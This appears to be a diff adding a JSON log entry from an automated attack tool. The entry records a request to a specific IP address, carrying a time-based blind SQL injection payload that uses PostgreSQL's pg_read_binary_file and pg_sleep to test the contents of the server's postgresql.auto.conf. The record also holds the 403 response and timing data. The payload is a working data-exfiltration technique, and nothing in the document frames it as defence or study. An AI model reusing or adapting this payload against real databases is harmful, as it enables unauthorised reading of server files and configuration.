@@ -1,0 +1,17 @@
+{
+  "curl_exit": 0,
+  "delay": 2.0,
+  "http_status": 403,
+  "key": "0||(SELECT CASE WHEN (pg_read_binary_file('/var/lib/postgresql/gcsdata/postgresql.auto.conf',0,1048576,true)=decode('2320446f206e6f74206564697420746869732066696c65206d616e75616c6c79210a232049742077696c6c206265206f7665727772697474656e2062792074686520414c5445522053595354454d20636f6d6d616e642e0a','hex')) THEN pg_sleep(2) ELSE pg_sleep(0) END)::text",
+  "label": "config_original",
+  "remote_ip": "34.8.201.231",
+  "request_sha256": "4078c5abb42dac0f2880e19a16133eacc2e40f6e4cb31ce08997d8012a8f583e",
+  "response_preview": "<!doctype html><meta charset=\"utf-8\"><meta name=viewport content=\"width=device-width, initial-scale=1\"><title>403</title>403 Forbidden",
+  "response_sha256": "c996c0469ef05ff6fdd1f7cefbc3f7e109bb21969de42fcf591498a828a7ad5f",
+  "response_size": 134,
+  "size_download": 134,
+  "time_total_s": 0.145472,
+  "utc_end": "2026-11-20T22:48:48.702398Z",
+  "utc_start": "2026-11-20T22:48:48.549147Z",
+  "wall_s": 0.153238
+}
